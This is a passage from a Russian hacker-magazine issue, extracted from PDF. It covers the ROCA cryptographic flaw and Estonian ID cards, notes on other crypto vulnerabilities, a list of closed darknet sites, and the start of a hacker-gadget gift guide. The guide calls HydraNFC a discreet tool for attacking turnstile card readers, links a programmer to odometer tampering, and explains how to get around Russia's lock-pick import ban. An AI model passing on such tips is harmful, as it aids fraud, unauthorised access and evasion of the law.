росом. Баг распространяет ся на TPM на базе спе цифи каций TCG 1.2 и 2.0.
  Спе циалисты да ли проблеме имя ROCA (Return of Coppersmith’s Attack),
ей был прис воен иден тифика тор CVE‐2017‐15361.
  Проблема получила широкую огласку в октябре 2017 года, когда Microsoft
представила свой ежемесячный набор обновле ний. В бюл летене AD‐
V170012 ком пания предупреждала о проблемах с криптогра фией в TPM Inﬁ‐
neon Technologies и сообщила, что раз реша ет исполь зование софтверных
алго ритмов для генерации более надежных RSA‐клю чей.
  Проблема затронула множес тво устройств, вклю чая про дукты HP, Acer, Fu‐
jitsu, Lenovo, LG, «Хром буки» и так далее. Причем устройства могут быть уяз‐
вимы вне зависимости от используемой опе рационной системы, в опас ности
находится любая ОС, работающая с проб лемными TPM. Также уязвимость
представ ляет  угрозу  для  некото рых  токенов  Yubikey  4,  генерирующих
ненадежные аутентификационные клю чи, из‐за чего теперь их вла дель цам
как мож но ско рее нужна замена.
  Еще сильнее ROCA уда рила по выпущен ным в Эстонии иден тификацион‐
ным картам, оснащен ным спе циальным чипом и позволяющим использовать
крип тографические подписи для некоторых операций. Оказалось, что уяз‐
вимость коснулась швей царской ком пании Gemalto AG, которая ранее при‐
обре ла фирму Trub AG, разработавшую и поставляющую Эстонии иден‐
тификационные кар ты для граждан. Как показало проведен ное эстонскими
властями рассле дование,  уязвимости подверже ны все  ID, выпущенные
в пери од с 14 октября 2014 года по 26 октября 2017 года. В ито ге еще в сен‐
тябре 2017 года власти страны начали уведомлять владельцев карт о необ‐
ходимос ти обновле ния удостоверений личности.
  В конеч ном сче те в ноябре 2017 года власти стра ны решили остановить
дей ствие сер тификатов ID‐карт из груп пы риска. Кар ты продол жали дей ство‐
вать в качестве удос товерения лич ности, но их стало невозможно исполь‐
зовать, к примеру, для покупки лекарств по электронным рецептам, работы
с налогами и для других операций, в которых задей ствован криптографичес‐
кий ключ.
   Карт с зак рытыми сертификатами насчитывается порядка 760 тысяч, и для
их обновле ния жителям необходимо обра титься в представительства Депар‐
тамента полиции и погранохраны или вос поль зоваться соответству ющей
услугой в режиме онлайн. Обновление сер тификатов стартовало в нояб‐
ре 2017 года и прод лится до 31 марта 2018 года. Пос ле 1 апре ля 2018 года,
по соображени ям безопас ности, все необновлен ные сер тификаты будут
аннулированы.
  Спе циалисты, обнаружившие ROCA, писали, что применить проблему
на практике, использовав ее для массовых атак, вряд ли получится, так как это
невыгод но для злоумыш ленни ков с эко номической точки зре ния. Дело в том,
что воссоздать 1024‐битный ключ, опираясь на откры тый ключ, получит ся
за примерно 97 дней работы CPU, и это будет стоить 40–80 долларов,
но для 2048‐битного клю ча понадо бится уже 51 400 дней и 20–40 тысяч дол‐
ларов. Впрочем, взлом 512‐бит ного клю ча зай мет все го два часа и обойдет‐
ся лишь в шесть центов.
  С эти ми выводами не согласились незави симые ИБ‐эксперты Дэни ел
Бернштейн (Daniel J. Bernstein) и Таня Лэндж (Tanja Lange). Они опуб ликовали
детальное иссле дование, согласно которо му эксплу ата ция ROCA на прак тике
может оказать ся дешев ле и про ще, чем предполагалось изначаль но.
   Хо тя Берн штейн и Лэндж пытались воспро извести атаку, имея на руках
лишь ограничен ные данные, опуб ликован ные пер вой группой иссле дова‐
телей, у них не прос то все получилось, но они даже нашли способ ускорить
нахождение 2048‐битного ключа на 5–25% и значительно сни зить стоимость
ата ки.





          циалис ты ком пании Venaﬁ под считали, что алгоритм SHA‐1, нев‐ →Спе
       зирая на его небезо пас ность, по‐преж нему используют 21% сайтов,
       то есть каждый пятый ресурс

           ная коман да исследователей рас ска зала об опасной уяз вимос ти →Свод
       в протоко ле сетевой аутен тифика ции Kerberos, которая поз воляет
       полностью обой ти всю процедуру аутентификации. Баг появил ся
       в коде Kerberos еще в 1996 году и зат рагивает две из трех имплемен‐
       таций протокола: Heimdal Kerberos и Microsoft Kerberos

         сперты обо ронного  научно‐технического  университета Народ‐ →Эк
       но‐освободи тельной армии  Китая  описали  новый  способ  атак
       на алго ритмы шифрования стандарта спутниковой телефонии GMR‐2.
       Атака может занимать доли секунды, после чего преступник получает
       в свое распоряжение ключ шиф рования и возможность «слушать»
       переговоры в режиме реального вре мени

         сле дователи Пенсильванского университета и Университета Джон‐ →Ис
       са Хопкинса обнаружили проб лему DUHK (Don’t Use Hard‐coded
        Keys). Корни уязвимости уходят к использованию генератора случай‐
       ных чисел ANSI X9.31, который широко применяется для соз дания
      клю чей шифрования для VPN‐соеди нений, браузерных сессий и не
       толь ко

         наруже на новая вари ация ата ки Блейхенбахера, которой дали наз‐ →Об
       вание ROBOT (Return Of Bleichenbacher’s Oracle Threat). Проблема
       позволяет   узнать   чужие  RSA‐ключи,   и  перед   ней   уяз‐
      вимы 27 из 100 наиболее популяр ных в интернете сайтов по версии
        Alexa, в том числе Facebook и PayPal
Каждый день в интернете и на его «темной стороне» закрывается множество
сайтов. О некоторых из них никто не вспом нит уже через неделю, но закрытие
дру гих может иметь серь езные и далеко иду щие последс твия.

                                      ,          ИНТЕРНЕТ
            КОТОРЫЙ МЫ
            ПОТЕРЯЛИ



   Не ожиданно прекратил свою работу
   один  из  крупней ших  и  наиболее
   популярных почтовых сервисов в дар‐
   кнете,  Sigaint. Сервис сущес твовал
   с 2015 года, им пользовалось поряд‐
   ка 42 тысяч человек.
    Закрытие Sigaint связывают с раз‐
   рушитель ной атакой на популярного
   в даркнете хостинг‐про вайдера Free‐
   dom  Hosting     II.  В  начале  фев‐
   раля 2017 года хостера взломали,
   в резуль тате чего были скомпромети‐
   рова ны 10 613 .onion‐сай тов. На всех
   пос традав ших  ресурсах  появилось                                     Ис следова тельница  Сара  Джей ми
   одинаковое     дефейс‐сооб щение,                                      Льюис (Sarah Jamie Lewis), представ‐
   в котором хакер объ яснял свои дей‐                                      ляющая про ект OnionScan, подсчи‐
    ствия.  Как  оказалось,  взломщик                                             тала, что ата ка на Freedom Hosting  II
   решил  «наказать»  хос тинг‐провай‐                                               затронула огромную часть даркнета.
   дера за дет ское пор но, которое в изо‐                                         Спус тя  месяц  после  инцидента
   билии  обна ружи лось  на  серверах                                           из 30 тысяч Tor‐сервисов, известных
   Freedom Hosting II.                                        проекту ранее, активными остались
                                       лишь око ло 4400.




  Об окончатель ном закрытии сервиса
   сообщили адми нис траторы  некогда
   популярного тор рент‐трекера Minino‐
   va.   Начавшись   как   «пиратский»
   ресурс,  Mininova  пытался  работать
   законно с 2009 года. Трекер сумел
    стать одним из самых крупных легаль‐
   ных торрент‐порталов в интернете,
   с него  загрузили более 950 мил‐
   лионов легальных торрентов.


                                        Прекратила работу одна из старейших
                                            торговых  пло щадок   в  даркнете,
                                             Outlaw.   Ресурс   был   основан
                                    еще  в  2013  году. Администра ция
                                        сообщила, что ресурс был взломан,
                                         одна ко  поль зователи  все  рав но
                                         подозревают,  что  операторы  поп‐
                                             росту сбежали с чужими день гами.
                                              Так же в мае 2017 года окон чательно
                                              закрылся  второй  по  популярности
                                         после The Pirate Bay торрент‐трекер
                                                     ExtraTorrent.   Операторы   ресурса
                                         не сообщили,  что послужило  при‐
                                          чиной закрытия, и не ста ли вда вать ся
  В резуль тате крупной международной                                             в детали.
   крупной операции была прекращена
   деятель ность сразу двух лидиру ющих
   даркнет‐маркетов: AlphaBay и Hansa
   Market. В  закрытии  торговых  пло‐
   щадок при няли участие США, Канада,
   Таиланд, Голландия, Великобритания,
   Франция, Литва, а также представите‐
   ли  Европола, ФБР  и  Управления
   по борьбе  с нар котика ми. Задер‐
   жанный руководитель AlphaBay покон‐
   чил с собой в камере тай ской тюрьмы.
    Не ожиданно     закрылся    один
                                  В офлайн ушла крупная крип товалют‐   из  наиболее  круп ных  мик сер‐сер‐
                                           ная  биржа  BTC‐e.  Как  ока залось,   висов в мире, BitMixer. Адми нистра‐
                                        проб лемы обменника были связаны   торы ресурса пояс нили, что работа
                                           с арес том его руководителя, граж‐   миксеров противоречит самой сути
                                          данина России Алексан дра Винника.    Bitcoin, проз рачной и неаноним ной
                                        Стоит  ска зать,  что осенью проект   по своей природе системы. Ранее
                                             «воз родил ся» под новым названием   опе рато рам  сайта  казалось,  что
                                        WEX.    у поль зователей бит койна есть право
                              О закрытии объ явил сайт HDClub,   на  анонимность  и  приват ность,
                                         один из ведущих пос тавщи ков «пират‐   но время показало, что это не так,
                                            ского» HD‐ и 3D‐кон тента в рунете   а «блокчейн — это открытая книга».
                                         и не только. Именно релизы HDClub
                                            зачастую распространялись на The
                                                      Pirate Bay и других круп ных тре керах.
                                     Проработав ший  более  десяти  лет
                                             сайт насчитывал порядка 170 тысяч
  МВД РФ отчиталось о ликвидации       активных  поль зовате лей  и  входил
   крупного    рус ско язычного    дар‐       в тысячу самых посеща емых ресур сов
   кнет‐маркета RAMP (Russian anony‐       рунета.
   mous   marketplace),   проведенной
   еще летом.
 COVERSTORY





 Андрей Письменный                        Евгений Зобнин                           Олег Купреев
     Шеф‐редактор                            Редактор Unixoid и Mobile                          Wi‐Fi‐хакер, независимый
  apismenny@gmail.com                                zobnin@glc.ru                            ресерчер, участник DC7499





    Илья Русанен                                                               Андрей Васильков
  Главный редактор ][,                                                                         редактор, фронемофил, гик,
занимаюсь разработкой и                                                                                                   к. м. н. и т. п.
     безопасностью                                                                             angstroem@hotbox.ru
     rusanen@glc.ru
 64
     ПОДАРКА
    ДЛЯ ГИКА
      ВЫБИРАЕМ ЛУЧШИЕ ХАКЕРСКИЕ ГАДЖЕТЫ
             ДЛЯ ДРУЗЕЙ И ДЛЯ СЕБЯ




 Мы собрали 64 устройства, среди которых ты наверняка най‐
 дешь что‐то, что порадует твоих друзей‐гиков на Новый год
 или любой другой праздник либо (мы зна ем, как это бывает!)
 станет отличным способом потратить денежки, подаренные
 тебе родственниками, у которых не было такого гайда.


  Итак, поехали! Порядок — случайный, нумерация толь ко для твоего удобства.


 Бла годар ности
 Редакция «Х» и авторы статьи выража ют рес пект Льву «shadowsoul» и Ярос‐
  лаву «P1nk13 P13» за пару отличных допол нений по паяльникам и локпикингу.
 Спасибо, ребята!



                      1

         UBERTOOTH ONE





 Официальный сайт
    Ubertooth — это опенсорсная железка для всяческих забав с Bluetooth
 и Bluetooth LE. «Убертус» способен захватывать и демодулировать радиосиг‐
 налы в диапазоне ISM 2,4 ГГц с полосой пропускания 1 МГц и использовани‐
 ем частотной модуляции.
    Зачем это нужно? По Bluetooth сейчас подключается масса беспроводных
 устройств, в том числе смарт‐часы, брас леты, клавиатуры и электронные зам‐
  ки. Многие из них никак не шифруют трафик. Подслушать телефонный раз‐
 говор по беспроводной гарнитуре с ходу не получится — для этого пот‐
 ребовалась бы полная поддержка GFSK и методы взлома шифрованного тра‐
 фика. Но вот про качать скиллы в Bluetooth (а заодно и перехватить сигнал
  клавиатуры и пароч ки дру гих устройств) шанс есть. Цена для такого веселья
 не так уж высока — порядка 120 долларов.


                    2

         LEVENHUK DTX 50





 Официальный сайт
    Этот цифровой микроскоп — отличный инстру мент для осмотра печатных
  плат, оценки качества пайки, поиска микродефектов и чтения маркировки
  чипов. По сути, это слегка дорабо танная веб‐камера, у которой перевернули
 фронтальную линзу. Доработ ка заключается в уста новке круговой под светки
 с регулируемой яркостью, кольца для изменения фокус ного рас стояния
 и штатива.
   Дешевые варианты таких микроскопов стоят от полутора тысяч и осна‐
 щаются матрицей с разрешением  0,3 Мп  (китай цы напишут на такой
  хоть 10 Мп, имея в виду бесполезный цифровой зум и программную интерпо‐
  ляцию). Но даже с ней можно добить ся интересных результатов, хоть
 работать будет и неудоб но.
   В более дорогих моделях (от пяти тысяч) ставят CMOS 1,3–2 Мп и более
 качественную оптику. Лучше заранее присмотреть отдельный штатив, пос‐
 кольку подставки из комплекта сделаны бес толко во. Стоит устройство поряд‐
  ка 6500 рублей.


              INFO

                        Если не удается сфокусироваться, слегка покрути
                        зум или попробуй изменить расстояние до рас‐
                        сматриваемого объекта. В  таких микроскопах
                          стоит очень примитивный контрастный автофокус
                         с низкой чувствительностью, а на малых рассто‐
                         яниях его сбивает собственная подсветка.


                     3

       PHILIPS HUE STARTER KIT





 Официальный сайт
    Умные лампочки в домах — это пока что редкость, так что стартовый набор
 для умного дома — это по‐прежнему интерес ный подарок. Продукты Philips
 недешевы, но они успели хорошо себя зарекомендовать. Стартовый набор
 из хаба и двух лампочек (без цветных диодов — с оттенками белого) можно
 найти от 7 тысяч рублей, более кру тая вер сия с тремя лампочками и вык‐
 лючателем стоит 15. Если будешь заказывать за рубежом, смотри, чтобы под‐
 ходил патрон и вилка хаба.


                  4

           LIMESDR MINI





 Crowd Supply
   SDR (software‐deﬁned radio) — это цифровые приемники радиосигналов
 с функцией сканирования каналов, адаптированные для хакерских изыс каний.
 К ним подключают внешние антенны раз ного типа, и для них есть специали‐
 зированный софт, в том числе твикнутые драйверы и прошивки.
    Типичный диапазон этих девайсов составляет порядка 24–1700 МГц.
 В  этот диапазон входит львиная доля занима тельного радиоэфира —
  от переговоров пилотов и городских служб до прямых трансляций с МКС.
 В нем же находятся управляющие сигналы электронных замков и систем опо‐
 вещения, телерадиовещание и сотовая связь. Простор для исследований
 просто огромный! Подробнее читай в «Хакере».
    LimeSDR Mini как раз и есть недорогая SDR‐ка, младший собрат уже став‐
 шего популярным LimeSDR. За какие‐то 140 долларов она позволит тебе вво‐
 лю позабавиться с радиотра фиком. Если HackRF и BladeRF с твоим бюд‐
 жетом несовместимы, то обра ти внимание.


                   5

      TREZOR BITCOIN WALLET





 Официальный сайт
    Аппаратные кошельки для хра нения криптовалю ты появились несколько
  лет назад, и Trezor Bitcoin Wallet был одним из первых. Сегодня это один
 из лучших способов обезопасить свой wallet.dat и сохранить намайненное
 тяжким трудом. Для проведения платежей нужно ввести пин‐код разбло‐
 кировки и подключить его по USB к компьюте ру.
   Шестистрочный OLED‐экран с разрешением 128 на 64 пикселя отобража‐
  ет информацию о выполняемых действиях. Для подтверждения транзакций
 используются механические кнопки. Это позволя ет быть уверенным, что сум‐
 ма перевода соответству ет введенной, а сам платеж уйдет по указанному
 адресу, даже если он осу ществляется в недоверенной среде (например,
 на чужом компьютере).
   Помимо Bitcoin, устрой ство поддерживает раз ные альткойны, в час тности
  Litecoin, DASH и Zcash. Внутри девайса уста новлен микропроцессор ARM
  Cortex M3 и работает собственная ОС.
     Trezor Bitcoin Wallet поддерживают Windows, Linux, Android и macOS, но на
 практике его можно использовать с любой ОС, способной запустить браузер.
 Обойдется эта полезная шту ка в 90 евро.


                  6

           BEAGLEBONE





 Официальный сайт
    Ты наверняка уже и сам перепробовал разные одноплатные компьюте ры
 и знаешь, что выбор огромен — от фирменной Raspberry Pi, которая хороша
  как подарок новичку, до китайщины вроде Banana Pi, которую лучше брать
 себе для экспериментов. Но если выбирать основу для хакерских девайсов,
  то отличный выбор — это BeagleBoard.
    Эта  платка  может  пос лужить  основой  для  собственного  роутера
 под хакинг Wi‐Fi или выделенной станцией для погружения в мир разного
 рода интерфейсов. Причем речь идет не только о получении рутшеллов через
 UART или же программировании чипов по SPI. Все гораздо интереснее. Нап‐
 ример, есть возможность побыть в статусе злого SPI slave устройства.
    Ну и пожалуй, главный козырь — это воз можность проксирования USB
 за счет наличия USB‐хоста и USB OTG из короб ки. Для одноплатников
  это большая редкость. Плюс есть мно го интересного соф та на GitHub. Стоить
  это чудо будет от 50 долларов.
    Как вариант, всегда есть Raspberry Pi. Вер сия 3B с четырьмя USB отлично
 подойдет начинающему. В России весь комплект с корпусом, заряд кой
 и флешкой можно приобрести где‐то за 5–6 тысяч руб лей.





                            Raspberry Pi Zero W

 В качестве интересного, но более бюджетного варианта можешь посмотреть
 на Raspberry Pi Zero W: с портами у этой малютки негусто, зато есть Wi‐Fi
 и Bluetooth. В России такая платка обойдется примерно в 2000 рублей.


                     7

    ORICO HDD EXTERNAL DOCKING
              STATION





  AliExpress
    Док‐станция с интерфейсом eSATA и USB 3.0 для подключения SATA‐
 накопителей (HDD/SSD) разных форм‐факторов (2,5/3,5″) и любого объема.
 Диски устанавливаются буквально одним движением — как карты памяти
 в картридер. Никаких инс тру ментов не требуется. Охлаждение пассивное
  (никакого шума!).
   Особенно горячим дискам можно добавить корпусный вентилятор 120 мм.
 Он идеально подходит по раз меру и прос то ста вит ся рядом. Если запитать
 его от 5 В (например, от USB или ста рой телефонной зарядки), то получится
 практически бесшумный обдув.
   Девайсы для гиков и продвинутых пользователей всегда выпускают
 малыми партиями. Они быстро исчезают из продажи, как это слу чилось
 с док‐станциями для жестких дисков. Если раньше Sarotech и ViPower пос‐
  тавляли в Россию прекрасные крэдлы с интерфей сом eSATA, то сейчас
 на рынке можно найти лишь ширпотреб ные поделки с USB 3.0.
   Выручает как раз Orico, да еще всего за 30 долларов. Та же фирма делает
 олдскульные док‐станции с eSATA, который поз воляет обращаться к накопи‐
 телям безо всяких огра ничений. Переназначение сбойных секторов, изме‐
 нение HPA, управле ние AAM, вос ста новление данных — все это воз можно
  только с нативным интерфейсом.


                  8

          APPLE AIRPODS





 Официальный сайт
    Если твой приятель обложился техникой Apple или хотя бы пользуется
 айфоном, то наушники AirPods должны его порадовать. Они легковесны, неп‐
 лохо звучат для своего размера, а главное — переключаются между устрой‐
  ствами без свойственного Bluetooth геморроя. Другая приятная фича — они
 автоматически  вык лючаются,  если  вынуть  из  уха  один  наушник  (но
 при желании можно включить обратно). Официальная цена в России —
 12 тысяч рублей.


                  9

            BATBAND





 Официальный сайт
    Технология  костной  проводимости  звука,  позволя ющая  избавиться
  от вкладышей или накладных наушников и переда вать звук пря мо в кость, —
 далеко не новинка. Компания AfterShokz не первый год успешно производит
  такие, а на AliExpress мож но найти сра зу нес коль ко его клонов. Вот только
 выглядят они все так, что надевать особо не хочется. Batband — более эле‐
  гантное решение, которое отлично подойдет в качестве подарка. Цена:
 200 дол ларов.


                  10

           ARDUINO MINI





 Варианты «Амперки»
    Платформа Arduino и ее многочисленные китайские клоны хороши для изу‐
 чения основ программирова ния микроконтроллеров. С их помощью можно
 быстро научиться писать управляющие скрипты, получать информацию с дат‐
 чиков и дергать любые устройства.
   В российском варианте, которые делают в «Амперке», много внимания
 уделено именно удобству изу чения. Русскоязычные описания, готовые схе‐
 мы — все это есть на сайте, так что для подарка начинающему это отличный
 вариант. Все в комплек те стоит 1400 рублей.
   Но если будешь дарить, не забудь предупредить получателя, что эта шту ка
 хороша именно для обучения и соз дания про тоти пов. А вот фигачить своего
 бигдога или наворо ченный умный дом на Arduino и прочих готовых компонен‐
  тах — не лучшая идея. Все равно потом придет ся перейти на ATmega328P
 или что‐нибудь подоб ное.


                     11

             «ТЕХ НОКУБ»





 Официальный сайт
    Когда покупаешь в подарок набор начина ющего мейкера, неплохо подыс‐
  кать такой, чтобы из него можно было сразу соб рать что‐нибудь работающее.
 На эту роль впол не подходит «Технокуб» — один из наборов «Амперки».
 Это кубик со светодиодами, который стоит на столе и оповещает о раз ных
 вещах. Но самое главное — это, конечно, соб рать самому. Набор сто‐
  ит 2500 рублей.


                                       Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
 64   ПОДАРКА ДЛЯ ГИКА
           ВЫБИРАЕМ ЛУЧШИЕ ХАКЕРСКИЕ ГАДЖЕТЫ
                        ДЛЯ ДРУЗЕЙ И ДЛЯ СЕБЯ





                    12

        STM32 DISCOVERY





Официальный сайт, «Чип и Дип»
  Настоящие разработчики embedded, конечно, с Arduino не сидят. Кто в XXI
веке проектирует железо на восьмибитном, когда можно взять 32‐битный
ARM из семейства STM32 за те же день ги? Если провес ти попарное срав‐
нение плат Arduino с их STM32‐ана логами, то выяснится, что STM32 дает
больше мегагерц, килобайтов и интерфей сов за те же деньги.
  Знакомство с STM32 мы рекомендуем начинать с приобретения любой
отладочной  платы  из  семейства  STM32  Discovery.  Эти  платы  стоят
от 1500 рублей и содержат сразу два чипа STM32, один из них (как правило,
STM32F0) служит отладчиком для второго, основного и более жирного мик‐
роконтроллера. Дело в том, что технология ST‐Link v2 поз воляет одному
STM32‐чипу отлаживать другой.
   Чип отладчика на платах STM32 Discovery можно использовать для про‐
шивки или отладки любого дру гого ARM‐микроконтрол лера, а не только
STM32, за счет заливки официальной прошивки, превращающей его в J‐Link.
  За управлением коммутацией меж ду чипами отвечает пара джамперов,
так что если будет желание переп рошить дру гой ARM, то дос таточно выс‐
тавить джамперы и подклю чить прошиваемое тело к отдельной выведенной
группе пинов с говорящим наз ванием SWD.


             INFO

                       Раз уж зашла речь о продвинутых тех никах прог‐
                    раммирования мик роконтроллеров,  то пореко‐
                     мендуем и софт. Когда Arduino IDE станет не хва‐
                            тать, можно начинать перебираться во взрослый
                    мир разработки под STM32 на осно ве связки
                    STM32CubeMX   и   SystemWorkbench    IDE.
                    STM32CubeMX позволяет генерировать код, ини‐
                      циализирующий железо, конфигурирующий наз‐
                       начение  пинов,  частоту  работы  контроллера.
                    При необходимости CubeMX позволяет добавить
                     минимальный HAL или же целый FreeRTOS в код
                      прошивки.  А  SystemWorkbench  представляет
                      собой адаптированный Eclipse в комплекте с тул‐
                       чейнами и прошивальщиком.


                    13

           HYDRABUS





Официальный сайт
  Еще одно инте ресное хакерское устройство на STM32 — это HydraBus.
Эта плата позволя ет работать с огромным количеством интерфейсов на em‐
bedded‐железе, причем для это го, как правило, ничего не требуется писать!
Прошивка HydraFW содержит небольшой и понятный командный интерфейс,
с которым можно начать работать с любым поддерживаемым интерфейсом
за пять минут. Более того, прошивка поддерживает скриптинг для автомати‐
зации типовых действий. Скрипты хранятся на SD‐карте, также возможен
автозапуск скрипта на выполнение, что при определенных условиях играет
решающую роль. Обойдется эта полезная желез ка всего в 50 евро.


                   14

           HYDRANFC





Официальный сайт
  Помимо самого HydraBus, есть также аппа рат ное расширение с говоря‐
щим названием HydraNFC. На данный момент HydraBus + HydraNFC —
это лучший ком плект для хакинга NFC. При чем не последнюю роль в этом
вопросе играет как раз воз можность заскриптовать атаку. Да и по цене она
куда дешев ле пресловутого Proxmark!
   Согласись, проще и незаметнее ата ковать считыватель карт на турникете
с помощью небольшого девайса, пишущего трей сы на SD‐карту, нежели сто‐
ять с ноутбуком и платой в ожидании неизбежно го появления охраны с инте‐
ресными  вопросами. Но  мы,  конечно,  настоятельно  не  рекомендуем
заниматься  такими шту ками. А  вот  что рекомендуем,  так  это  купить
HydraNFC — и другу, и себе. Версия плат ки отдель но от «гид робаса» обой‐
дется в 80 евро, а в полном комплекте — в 150.


                   15

         MINIPRO TL866CS





«Техноцентр», AliExpress
   Универсальный параллельный программа тор, который поддержи вает бо‐
лее 13 тысяч интегральных схем. Наиболее вос требован в автомобильном
чип‐тюнинге и «корректировке» одометров. Также используется для переп‐
рошивки материнок и ИС бытовой техники.
   MiniPro TL866CS подключается по USB. Драйверы есть для Windows раз‐
ных версий — от «винтукея» до 64‐битной «восьмерки». Под «десяткой» тоже
должен работать, но из личного опыта мы совету ем строго Windows 7 x86.
Цена — 3000 рублей.


                  16

FT2232H USB 2.0 HI-SPEED BREAKOUT
            BOARD





Магазин Seeed
  Платы на основе чипа FTDI FT232 — это удоб ные многофункциональные
устройства, которые позволяют решать самые разные задачи, связанные
с железом. В частности, можно наладить работу с целым семейством пос‐
ледовательных интерфейсов: UART, SPI, I2C, JTAG.
  Наличие режима программного «дрыгания» отдель но взя той ножкой (GPIO
bit‐bang) позволяет легко реализовать простое вклю чение/выключение диода
или же работу со специфичным низкоско ростным интерфейсом, типа 1‐Wire.
Таким опусканием и поднятием уровня ножки и реализована программная
поддержка SPI, JTAG, AVR ISP, I2C.
  Обычная плата на основе чипа FT232RL сейчас стоит копейки, но не спе‐
ши ее брать, так как bit‐bang существенно ограничивает скорость работы
интерфейса из‐за своей программной сути. Лучше не ску питься и, докинув
пару баксов, приобрести себе на роль программатора что‐нибудь на основе
чипа FT232H. Ну или поискать что‐нибудь с AliExpress.
  Причина — реализация в FT232H режима MPSSE (Multi‐Protocol Syn‐
chronous Serial Engine). Эта технология позволяет аппаратно эмулировать
перечисленные интерфейсы, за счет чего получается сущес твенный прирост
в скорости работы.
  Плата  FT232H  позволяет  в  режиме  UART  работать  на  скорости
в 12 мегабод и до 6 мегабод в режиме MPSSE. В случае с FT232R речь идет
о скорости всего в 3 мегабода в режиме UART и менее мегабара в режиме
bit‐bang. Так что советую не пос купиться на FT232H и сэкономить себе нервы
и время, избежав мытарств с лагами bit‐bang. Тем более стоит подобная ско‐
ростная прелесть всего 27 долларов.


                    17

         BUS BLASTER V4





Магазин Seeed
   Если скорости и возможнос ти FT232H кажутся слишком скромными, обра‐
ти внимание на устрой ства на чипе FT223H. По сути, это два FT232H в одном
корпусе. А это значит в два раза больше интерфейсов и в два раза больше
скорость. Именно на основе 2232H сделано боль шинство «фирменных» прог‐
рамматоров.
  Из готовых девайсов хорош Bus  Blaster  v4, который можно  купить
за 45 долларов. Особенность устройства в том, что, помимо чипа FT2232H,
на плате есть неболь шая CPLD производс тва Xilinx. Эта CPLD используется
как логический буфер для конверта ции логических уровней 1,5–3,3 В в понят‐
ный для FTDI чип 3,3 В. Это поз волит тебе подключаться к интерфейсам
на мобилках, где, как правило, используется логичес кий уровень в 1,8 В для
энергоэффективности. Более того, CPLD‐буфер может быть запрограм‐
мирован для поддержки разных модификаций JTAG, за счет чего реализован,
например, интерфейс SWD, который идет на смену JTAG.
  Еще один довод в пользу FT223H — наличие примера реализации работы
с NAND на осно ве это го чипа. Подробнее смотри тут и тут.
  По части софта чипы FTDI поддерживаются в популярном отладчике
OpenOCD и программаторе Flashrom. А еще сущес твует мас са библиотек
под разные языки программирования, так что можешь сам запилить то, чего
еще нет.


                  18

             PASTILDA





Crowd Supply
  Один из ярких представителей семей ства STM32 — аппаратный менеджер
паролей Pastilda. Это полностью открытая платформа, которая решает задачу
безопасной авторизации в недоверенной среде. Pastilda выглядит как длин‐
ная флешка с двумя пор тами USB — в один подклю чается клавиатура, в дру‐
гой — кабель к компьютеру.
   Pastilda может работать в одном из двух режимов: прозрачном и защищен‐
ном. В прозрачном режиме все скан‐коды клавиатурных нажатий просто
транслируются в порт USB без изменений. В защищенном режиме происхо‐
дят обращения к парольной базе, которая хра нится в формате KeePass и рас‐
шифровывается только во внутренней памяти Pastilda. Все возможные кейлог‐
геры и трояны не могут до нее дотянуться, пос коль ку компьютер по‐прежнему
«видит» модуль Pastilda как клавиату ру.
  Оговоримся, что мы не тестировали этот девайс, но его описание нас
заинтересовало. Заказать устройство мож но за 65 долларов в минимальном
варианте.


                  19

          PULSERAIN M10





Crowd Supply
  Отладочные платы на базе ПЛИС (FPGA) час то используются для рас‐
ширения возможностей одноплатных компь ютеров. Они увеличивают число
доступных GPIO, самостоятельно обра батывают часть данных и передают их
основному процессору. С их помощью можно даже превратить Raspberry Pi
в JTAG‐программатор.
   PulseRain M10 — интерес ная раз рабатываемая FPGA‐плата. В отличие
от многих аналогов она предлагает программный интерфейс и форм‐фактор,
совместимый с Arduino. Проект PulseRain полностью открыт — от дизайна
платы до кода системы и приложений. Сей час ты можешь успеть отхватить
платку по предзаказу всего за 85 дол ларов. К этому Новому году, конечно,
не поспеет, но возьми на заметку.


                 20

         XIAOMI MI BAND 2





Официальный сайт
   Mi Band 2 не первый год существу ет на рын ке, но продолжает оставаться
идеальным подарком тем, кто до сих пор не обзавелся умными часами
или фитнес‐трекером. Браслет  практически  невесом,  работает месяц
на одном заряде, позволяет отслеживать шаги, пульс, фазы сна, нежно
будить хозяина по утрам, уведомлять о звонках, СМС и событиях в любых
приложениях. Он не боится воды, совместим с iPhone, Android и стоит все‐
го 1500 рублей.


                    21

         NOKIA STEEL HR





Официальный сайт
  Фирма Withings, которая перешла под крыло Nokia, делает умные весы,
термометры и тонометры, однако это далеко не самые веселые подарки —
особенно если твой друг действительно нуждает ся в чем‐то из этого. А вот
модные часики, которые заодно работают в качестве шагоме ра, умеют сле‐
дить за сном и измерять пульс, — самое то. Они продаются у нас и стоят
порядка 20 тысяч рублей.


                   22

           POCKETCHIP





Официальный сайт
   Это  док‐станция для одноплатного компьюте ра  C.H.I.P., сде ланного
на базе однокристалки Allwinner К8. PocketCHIP добавляет к нему дисплей
с сенсорным экраном (480 × 272) и светодиодной подсветкой, миниатюрную
QWERTY‐клавиатуру и литий‐полимерную батарею — все в легком проз‐
рачном корпусе. Также на PocketCHIP есть видеовыход и разъем 1/8″
для подключения наушников. Контакты GPIO легко размыкаются для подклю‐
чения разной перифе рии. Выводы UART предназначены для отладочного
доступа к самому C.H.I.P..
  В общем, за 70 дол ларов ты можешь приобрести хардверный хакерский
терминал — микрокомпь ютер размером с кредитку, способный проработать
до пяти часов в автономном режиме. В нем будет процессор ARM v7 с так‐
товой частотой 1 ГГц, 512 Мбайт оперативной памяти, ГП Mali 400, Wi‐Fi
и Bluetooth, а главное — программируемые вводы/выводы и собственный
дисплей с клавиатурой.
  Постой, мы написали «можешь приобрести»? Увы, в данный момент
не можешь — заказы пока приоста новлены до пос тупления новой партии. Что
ты можешь купить (и даже преподнести в подарок) — это лицензию на эму‐
лятор фантазийной ретроконсоли PICO‐8, под который и раз рабатывал ся
PocketCHIP.


                   23

      SPARROWS LOCK PICKS





Официальный сайт
   Локпикинг, или вскрытие замков, — давнее хакерское увле чение —
по большей части, конечно, чисто развлекатель ное. Прос тые замки можно
открыть и скреп кой, а вот для упражнений с более сложными потребуются
отмычки. Они бывают раз ными для каждого типа замков, и их можно легально
приобрести во многих странах, включая Россию. Для начинающих отлично
подойдет набор Sparrows Lock Picks. Замки и отмычки от 20 баксов за пак
порадуют сердце начина ющего медвежат ника.


           WARNING

                    Покуп ка отмычек в России без специального раз‐
                     решения незаконна, поэтому посылку с ними
                        могут изъять, а в  худшем  случае — завести
                       на тебя дело по статье 138.1 УК РФ. Обойти
                        это можно, например, получив посылку за гра‐
                      ницей и привезя потом комплект с собой.


                  24

